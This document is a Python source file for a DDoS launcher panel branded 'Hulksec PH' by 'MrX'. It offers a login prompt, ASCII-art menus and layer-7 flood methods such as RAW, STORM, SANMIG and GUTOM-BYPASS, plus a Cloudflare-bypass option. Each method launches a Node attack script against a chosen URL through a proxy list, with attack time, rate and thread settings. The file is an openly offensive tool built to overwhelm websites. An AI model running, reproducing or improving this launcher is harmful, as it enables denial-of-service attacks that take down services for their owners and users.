from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs


author = "MrX"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

proxys = open('proxy.txt').readlines()
bots = len(proxys)

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")

start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def special():
    os.system ("clear")
    
    print ("")
    print (f"""
                                            
          \033[96;1mTYPE:\033[0m [\033[94;1mMETHOD\033[0m] [\033[92;1mURL\033[0m] [\033[95;1mTIME\033[0m] [\033[91;1mTHREAD\033[0m]   
\033[96
                                            
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[34m═══════════════════════════════════════\033[0m
            \033[34m║                                 \033[34m║
\033[36m        ╔═════════════════════════════════════════╗\033[0m
        \033[34m║               Hulksec PH                ║
        \033[34m║             Developer: MrX              ║
        \033[34m║           Hulksec Special Tool          ║
        \033[36m╚═════════════════════════════════════════╝\033[0m
                            \033[34m║ ║
            \033[36m╔═════════════════════════════════╗\033[0m
                    \033[36m║\033[0m      \033[34mSTORM      \033[36m║
                    \033[36m║\033[0m       \033[34mRAW       \033[36m║
                    \033[36m║\033[0m      \033[34mPROXY      \033[36m║
                    \033[36m║\033[0m     \033[34mCFBYPASS    \033[36m║
                    \033[36m╚═════════════════╝\033[0m

""")



def l7():
    os.system ("clear")

    print ("")
    print (f"""
    \033[96;TTYPE: [\033[94;1mMETHOD\033[0m] [\033[94;1mGET/POST\033[0m] [\033[92;1mURL\033[0m] [\033[95;1mTIME\033[0m] [\033[93;1mRATE\033[0m] [\033[91;1mTHREAD\033[0m]

               
                                                       
                                                       

                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[34m═══════════════════════════════════════\033[0m
            ║                                 ║
\033[36m        ╔═════════════════════════════════════════╗\033[0m
        \033[36m║               \033[34mHulksec PH\033[0m                \033[36m║
        \033[36m║             \033[34mDeveloper: MrX\033[0m              \033[36m║
        \033[36m║           \033[34mHulksec Layer7 Tool\033[0m           \033[36m║
        \033[36m╚═════════════════════════════════════════╝\033[0m
                            ║ ║
           \033[36m ╔═════════════════════════════════╗\033[0m
                    \033[36m║      \033[34mPANCIT\033[0m     \033[36m║
                    \033[36m║      \033[34mSANMIG\033[0m     \033[36m║
                    \033[36m║      \033[34mSOPAS\033[0m      \033[36m║
                    \033[36m║   \033[34mGUTOM-BYPASS\033[0m  \033[36m║
                    \033[36m╚═════════════════╝\033[0m
""")

def help():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[36m
                                            
                                            
                                           
    \033[94m Created by \033[91mMrX\033[0m | \033[93mCommand Center: \033[96mHelp\033[0m | \033[92mVersion: \033[95m∞\033[0m
                                            
              \033[36m╔═════════════════════════════════╗\033[0m
              
                     \033[36;1mL7\033[0m  ► \033[34mSHOW l7 METHODS\033[0m 
                \033[36;1mSPECIAL\033[0m  ► \033[34mSHOW SPECIAL METHODS\033[0m
                
              \033[36m╚═════════════════════════════════╝\033[0m
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
                \033[35m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⢬⣧⠀⠙⣆⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠉⠀⠀⠀⠈⠀⠀⠙⠉⠉⠛⠳⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣩⠀⠀⠀⠀⠀⠀⢿⣿⠛⣿⣶⣶⣤⣤⡀⠀⠀⠀⠀⠀⠀
                 ⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠈⣿⣇⠉⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀
                 ⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢳⠀⠀⠀⠀⠀⡄⠘⢿⣆⢨⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀
                 ⠀⠀⠀⣀⣠⣾⠏⠀⠀⠀⡇⠀⠀⠀⠀⠀⢠⠀⠀⢹⡀⠀⠘⣧⠀⠀⠀⠀⢹⡀⠈⢻⣷⣜⠛⡿⠀⠀⠀⠀⠀⠀⠀
                 ⠀⣴⣿⣿⣿⠏⠀⡀⠀⠀⣷⠀⠀⠀⠀⠀⢸⡄⠀⠈⣧⠀⠀⠘⣆⠀⠀⠀⠘⡇⠀⠀⠙⡿⣿⣷⡀⠀⠀⠀⠀⠀⠀
                 ⠀⢻⣿⣿⡏⠀⠀⡇⠀⠀⢸⡄⠀⠀⠀⠀⠈⣷⣄⠀⠘⣷⡀⠀⠘⣆⠀⠀⠀⣧⠀⠀⠀⢧⠈⠻⣷⡀⠀⠀⠀⠀⠀
                 ⠀⠈⣿⡿⠀⢰⠀⣧⠀⠀⢸⠻⣆⠀⠀⠀⠀⣷⠘⢦⡀⠘⣿⣤⡀⠹⣄⠀⠀⢹⠀⠀⠀⠘⣧⠀⠙⣷⡀⠀⠀⠀⠀
                 ⠀⠀⢸⠇⠀⠸⢠⡿⣄⠀⢸⠀⠈⠛⠦⣤⣀⣹⣶⡶⠿⠲⠮⢯⣽⣦⣻⡀⠀⢸⠀⠀⠀⠀⢹⡆⠀⠸⣧⠀⠀⠀⠀
                 ⠀⠀⣿⠀⠀⢀⣾⠁⠙⣦⣸⡦⠖⠉⠀⠀⠈⠉⠈⠃⠀⠀⠀⠀⠀⠀⠈⣯⠀⢸⠀⠀⠀⠀⠀⢻⠀⠀⢹⣇⠀⠀⠀\033[0m
                 \033[31m⠀⣸⡏⠀⠀⢸⠇⠀⠀⠈⠙⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⡶⢲⣿⠀⢸⠀⠀⠀⠀⠀⠘⡇⠀⢸⢹⣆⠀⠀
                 ⠀⣿⣇⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡯⠿⠛⠋⠉⠉⠁⠘⡄⢸⠀⠀⠀⠀⠀⠀⢷⠀⢸⢀⣿⡄⠀
                 ⢀⡟⢸⠀⠀⢸⡇⠀⣀⡤⣶⣾⣿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⢀⢀⡀⣤⠀⡇⢸⠀⠀⠀⠀⠀⠀⢸⠀⢸⢸⠙⣇⠀
                 ⢸⡇⠸⡄⠀⠘⣧⠼⠷⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠘⠋⠉⠉⠀⡇⣼⠀⠀⠀⠀⠀⠀⢸⠀⡼⣼⠀⢻⠀
                 ⢸⡧⡀⣧⠀⠀⢿⠀⠀⢰⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠀⠀⠀ ⣧⡇⠀⠀⠀⠀⠀⠀⢸⠀⢣⠇⠀⢸⡄
                 ⢸⡇⢧⠘⣆⠀⠸⣇⠀⠈⠀⠀⠀⣀⣀⣀⠤⠴⢒⣒⠽⠛⠁⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⡜⢠⡟⠀⠀⢸⡇
                 ⢸⡇⠈⢧⠹⡄⠀⢻⡀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⣀⡴⠆⣿⠀⠀⠀⠀⠀⠀⠀⣧⡞⠀⠀⠀⢸⠇
                 ⠈⣧⠀⠈⢷⡹⣄⠈⠷⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠛⢉⡤⢾⠃⠀⠀⠀⠀⠀⠀⢸⠏⠀⠀⠀⠀⣼⠀
                 ⠀⠹⣆⠀⢀⠳⡌⢢⡀⠀⠈⠉⣹⠙⠛⣚⠛⣟⡛⠻⣿⠟⢁⡤⠞⠉⠀⡟⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⣼⠃⠀
                 ⠀⠀⢻⡄⢸⡄⠙⢦⡀⠀⠀⠀⢸⣆⠀⠈⠳⣄⡙⢲⣽⠞⠉⠀⠀⢀⣼⠃⠀⠀⠀⠀⢀⣤⠞⠃⠀⠀⣠⡾⠋⠀⠀
                 ⠀⠀⠀⠹⣦⣿⣦⡀⠙⠳⢤⣀⡘⣿⠛⠶⢤⣤⣉⣟⠁⠀⠀⣠⣾⣿⡏⠀⠀⢀⣠⣶⣿⣧⠤⠤⠶⠛⠉⠀⠀⠀⠀
                 ⠀⠀⠀⠀⠈⢻⣦⡙⠳⠦⢤⣄⣁⣹⣆⠀⠀⠀⡼⣻⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⡄⠀⠀⠀\033[0m
                 ⠀⠀⠀⠀⠀
                             \033[36mDEVELOPER\033[0m: \033[34mMrX\033[0m
                 \033[36mARE YOU NEW TO PANEL? THEN TYPE\033[0m: \033[34mHELP\033[0m
                           \033[36mTO SEE ALL\033[0m \033[34mMETHODS\033[0m
                                  
""")

    while True:
        sys.stdout.write("\x1b]2;[\] Mrx-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
        sin = input("\033[34m╔═══\033[34m[root\033[34m@\033[34mMrX\033[34m]\n╚══\x1b[38;2;0;255;189m> \033[34m")
        sinput = sin.split(" ")[0]
        if sinput.lower() in ["clear", "cls"]:
            os.system("clear")
            main()
        if sinput.lower() in ["help", ".help", "Help", ".HELP", "method", "METHOD", ".method"]:
           help()
        if sinput.lower() in ['l7']:
           l7()
        if sinput.lower() in ['special', 'sp']:
           special()
        if sinput == "stop" or sinput == "STOP":
            os.system ("pkill screen")
            main()          
            
#########LAYER-12########
        elif sinput == "RAW":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                thread = sin.split()[3]
                os.system(f'cd l7 && screen -dm node raw.js {url} {time} raw {thread}')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[34m═══════════════════════════════════════
            ║                                 ║
\033[36m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Special Tool          ║
        ╚═════════════════════════════════════════╝\033[0m
                            ║ ║
           \033[34m ╔═════════════════════════════════╗
               Method   : [RAW]
               TARGET   : [{url}]
               TIME     : [{time}]
               THREAD   : [{thread}]
            ╚═════════════════════════════════╝\033[0m

""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "STORM":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                thread = sin.split()[3]
                os.system(f'cd l7 && screen -dm node raw.js {url} {time} storm {thread}')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[34m═══════════════════════════════════════
            ║                                 ║
\033[36m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Special Tool          ║
        ╚═════════════════════════════════════════╝\033[0m
                            ║ ║
           \033[34m ╔═════════════════════════════════╗
               Method   : [STORM]
               TARGET   : [{url}]
               TIME     : [{time}]
               THREAD   : [{thread}]
            ╚═════════════════════════════════╝\033[0m

""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "PROXY":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                thread = sin.split()[3]
                os.system(f'cd l7 && screen -dm node raw.js {url} {time} proxy {thread}')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[34m═══════════════════════════════════════
            ║                                 ║
\033[36m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Special Tool          ║
        ╚═════════════════════════════════════════╝\033[0m
                            ║ ║
           \033[34m ╔═════════════════════════════════╗
               Method   : [PROXY]
               TARGET   : [{url}]
               TIME     : [{time}]
               THREAD   : [{thread}]
            ╚═════════════════════════════════╝\033[0m

""")
            except ValueError:
                l7()
            except IndexError:
                l7()
#########LAYER-7########

        elif sinput == "SOPAS":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                rate = sin.split()[3]
                thread = sin.split()[4]
                os.system(f'cd l7 && screen -dm node vip.js {url} {time} {rate} {thread} proxy.txt')
                os.system ("clear")
                print (f"""
                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
                TARGET:  [{url}]
                METHOD:  [SOPAS]
                TIME:    [{time}]
                RATE:    [{rate}]
                THREADS: [{thread}]
                ZOMBIES: [85]
            ╚═════════════════════════════════╝

          
""")
            except ValueError:
                l7()
            except IndexError:
                l7()
                

        elif sinput == "SANMIG":
            try:
                MODE = sin.split()[1]
                url = sin.split()[2]
                time = sin.split()[3]
                rate = sin.split()[4]
                thread = sin.split()[5]
                os.system(f'cd l7 && screen -dm node tlsb.js {MODE} {url} proxy.txt {time} {rate} {thread}')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[34m═══════════════════════════════════════
            ║                                 ║
\033[36m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝\033[0m
                            \033[34m║ ║
            ╔═════════════════════════════════╗
                TARGET:  [{url}]
                METHOD:  [SANMIG]
                MODE:    [{MODE}]
                TIME:    [{time}]
                RATE:    [{rate}]
                THREADS: [{thread}]
                ZOMBIES: [85]
            ╚═════════════════════════════════╝\033[0m

""")
            except ValueError:
                l7()
            except IndexError:
                l7()
                
        elif sinput == "GUTOM-BYPASS":
            try:
                MODE = sin.split()[1]
                url = sin.split()[2]
                time = sin.split()[3]
                rate = sin.split()[4]
                thread = sin.split()[5]
                os.system(f'cd l7 && screen -dm node BYPASS.js {MODE} {url} proxy.txt {time} {rate} {thread}')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[34m═══════════════════════════════════════
            ║                                 ║
\033[36m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝\033[0m
                            \033[34m║ ║
            ╔═════════════════════════════════╗
                TARGET:  [{url}]
                METHOD:  [GUTOM-BYPASS]
                MODE:    [{MODE}]
                TIME:    [{time}]
                RATE:    [{rate}]
                THREADS: [{thread}]
                ZOMBIES: [85]
            ╚═════════════════════════════════╝\033[0m

""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "PANCIT":
            try:
                MODE = sin.split()[1]
                url = sin.split()[2]
                time = sin.split()[3]
                rate = sin.split()[4]
                thread = sin.split()[5]
                os.system(f'cd l7 && screen -dm node rambutan.js {MODE} {url} proxy.txt {time} {rate} {thread}')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[34m═══════════════════════════════════════
            ║                                 ║
\033[36m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝\033[0m
                            \033[34m║ ║
            ╔═════════════════════════════════╗
                TARGET:  [{url}]
                METHOD:  [PANCIT]
                MODE:    [{MODE}]
                TIME:    [{time}]
                RATE:    [{rate}]
                THREADS: [{thread}]
                ZOMBIES: [85]
            ╚═════════════════════════════════╝\033[0m

          
""")
            except ValueError:
                l7()
            except IndexError:
                l7()
def login():
	sys.stdout.write(f"\x1b]2;[\] ANON-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = ""
	passwd = ""
	username = input("""\033[96m
	

                  \033[34m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⢉⠤⠐⠋⠈⠡⡈⠉⠐⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                  ⠀⠀⠀⠀⢀⡀⢠⣤⠔⠁⢀⠀⠀⠀⠀⠀⠀⠀⠈⢢⠀⠀⠈⠱⡤⣤⠄⣀⠀⠀⠀⠀⠀
                  ⠀⠀⠰⠁⠀⣰⣿⠃⠀⢠⠃⢸⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⢞⣦⡀⠈⡇⠀⠀⠀
                  ⠀⠀⠀⢇⣠⡿⠁⠀⢀⡃⠀⣈⠀⠀⠀⠀⢰⡀⠀⠀⠀⠀⢢⠰⠀⠀⢺⣧⢰⠀⠀⠀⠀
                  ⠀⠀⠀⠈⣿⠁⡘⠀⡌⡇⠀⡿⠸⠀⠀⠀⠈⡕⡄⠀⠐⡀⠈⠀⢃⠀⠀⠾⠇⠀⠀⠀⠀
                  ⠀⠀⠀⠀⠇⡇⠃⢠⠀⠶⡀⡇⢃⠡⡀⠀⠀⠡⠈⢂⡀⢁⠀⡁⠸⠀⡆⠘⡀⠀⠀⠀⠀
                  ⠀⠀⠀⠸⠀⢸⠀⠘⡜⠀⣑⢴⣀⠑⠯⡂⠄⣀⣣⢀⣈⢺⡜⢣⠀⡆⡇⠀⢣⠀⠀⠀⠀
                  ⠀⠀⠀⠇⠀⢸⠀⡗⣰⡿⡻⠿⡳⡅⠀⠀⠀⠀⠈⡵⠿⠿⡻⣷⡡⡇⡇⠀⢸⣇⠀⠀⠀
                  ⠀⠀⢰⠀⠀⡆⡄⣧⡏⠸⢠⢲⢸⠁⠀⠀⠀⠀⠐⢙⢰⠂⢡⠘⣇⡇⠃⠀⠀⢹⡄⠀⠀
                  ⠀⠀⠟⠀⠀⢰⢁⡇⠇⠰⣀⢁⡜⠀⠀⠀⠀⠀⠀⠘⣀⣁⠌⠀⠃⠰⠀⠀⠀⠈⠰⠀⠀
                  ⠀⡘⠀⠀⠀⠀⢊⣤⠀⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠄⠀⢸⠃⠀⠀⠀⠀⠀⠃⠀
                  ⢠⠁⢀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠸⠀
                  ⠘⠸⠘⡀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠁⠀⠃⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⢠⠀⠀⡇
                  ⠀⠇⢆⢃⠀⠀⠀⠀⠀⡏⢲⢤⢀⡀⠀⠀⠀⠀⠀⢀⣠⠄⡚⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀
                  ⢰⠈⢌⢎⢆⠀⠀⠀⠀⠁⣌⠆⡰⡁⠉⠉⠀⠉⠁⡱⡘⡼⠇⠀⠀⠀⠀⢀⢬⠃⢠⠀⡆
                  ⠀⢢⠀⠑⢵⣧⡀⠀⠀⡿⠳⠂⠉⠀⠀⠀⠀⠀⠀⠀⠁⢺⡀⠀⠀⢀⢠⣮⠃⢀⠆⡰⠀
                  ⠀⠀⠑⠄⣀⠙⡭⠢⢀⡀⠀⠁⠄⣀⣀⠀⢀⣀⣀⣀⡠⠂⢃⡀⠔⠱⡞⢁⠄⣁⠔⠁⠀
                  ⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠁⠀⠀⠀⠀
                  ⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀ \033[0m

                \033[36m WHAT'S GOOD STUPID?\033[0m \033[36mGREED FOR DDOS?\033[0m 
                    \033[34mWHAT'S MAKES YOU TO BE HERE?\033[0
                            AINT FOR KIDS THO
   
[USERNAME]
> """)

	password = getpass.getpass(prompt='[PASSWORD]>   ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		time.sleep(0.5)
		main()

login()